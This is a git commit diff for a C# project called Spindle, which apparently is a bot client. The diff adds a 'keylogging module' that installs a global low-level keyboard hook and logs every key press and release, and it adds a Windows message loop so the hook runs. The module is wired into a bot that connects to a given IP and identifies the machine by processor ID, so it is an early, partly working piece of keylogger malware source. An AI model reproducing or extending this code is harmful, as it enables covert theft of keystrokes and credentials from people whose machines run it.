291256400073a8a299243cb1771819a3f03809c2
Goz3rr <wisse.aarts@zonnet.nl>
2015-12-10 17:12:08 +0100

    start keylogging module

---
+++ CoreModule/Modules/Logger.cs
@@ -0,0 +1,79 @@
+﻿using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using Spindle;
+
+namespace CoreModule.Modules {
+    public class Logger : IBotModule {
+        private enum HookType {
+            WH_JOURNALRECORD = 0,
+            WH_JOURNALPLAYBACK = 1,
+            WH_KEYBOARD = 2,
+            WH_GETMESSAGE = 3,
+            WH_CALLWNDPROC = 4,
+            WH_CBT = 5,
+            WH_SYSMSGFILTER = 6,
+            WH_MOUSE = 7,
+            WH_HARDWARE = 8,
+            WH_DEBUG = 9,
+            WH_SHELL = 10,
+            WH_FOREGROUNDIDLE = 11,
+            WH_CALLWNDPROCRET = 12,
+            WH_KEYBOARD_LL = 13,
+            WH_MOUSE_LL = 14
+        }
+
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        public string Identifier => "LOGGER";
+
+        private const int WM_KEYDOWN = 0x100;
+        private const int WM_KEYUP = 0x101;
+
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        public Logger() {
+            _hookID = SetHook(HookCallback);
+        }
+
+        private IntPtr SetHook(HookProc proc) {
+            Console.WriteLine("Hooking logger");
+            using(Process p = Process.GetCurrentProcess()) {
+                using(ProcessModule m = p.MainModule) {
+                    IntPtr hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, proc, IntPtr.Zero, 0);
+                    
+                    return hook;
+                }
+            }
+        }
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            if(nCode >= 0) {
+                if(wParam == (IntPtr)WM_KEYDOWN) {
+                    int vkCode = Marshal.ReadInt32(lParam);
+                    Console.WriteLine("down: " + (Keys)vkCode);
+                } else if(wParam == (IntPtr)WM_KEYUP) {
+                    int vkCode = Marshal.ReadInt32(lParam);
+                    Console.WriteLine("up: " + (Keys)vkCode);
+                }
+            }
+
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        public string CommandReceived(string command) {
+            throw new NotImplementedException();
+        }
+    }
+}
--- Spindle/Program.cs
+++ Spindle/Program.cs
@@ -1,8 +1,32 @@
 ﻿using System;
+using System.Runtime.InteropServices;
 
 namespace Spindle {
-    class Program {
-        static void Main(string[] args) {
+    internal class Program {
+        private static class NativeMethods {
+            [Serializable]
+            public struct MSG {
+                public IntPtr hwnd;
+                public IntPtr lParam;
+                public int message;
+                public int pt_x, pt_y;
+
+                public int time;
+
+                public IntPtr wParam;
+            }
+
+            [DllImport("user32.dll")]
+            public static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+
+            [DllImport("user32.dll")]
+            public static extern bool TranslateMessage([In] ref MSG lpMsg);
+
+            [DllImport("user32.dll")]
+            public static extern IntPtr DispatchMessage([In] ref MSG lpmsg);
+        }
+
+        private static void Main(string[] args) {
             Console.Write("enter ip: ");
             string ip = Console.ReadLine();
             if(String.IsNullOrEmpty(ip)) ip = "127.0.0.1";
@@ -10,7 +34,12 @@ namespace Spindle {
             Console.WriteLine("ProcessorID = " + Util.GetObject("Win32_Processor", "ProcessorID"));
             Bot bot = new Bot(ip, Util.GetObject("Win32_Processor", "ProcessorID"));
 
-            Console.ReadKey();
+            // windows message queue handling to make hooks work
+            NativeMethods.MSG msg;
+            while((!NativeMethods.GetMessage(out msg, IntPtr.Zero, 0, 0))) {
+                NativeMethods.TranslateMessage(ref msg);
+                NativeMethods.DispatchMessage(ref msg);
+            }
         }
     }
 }
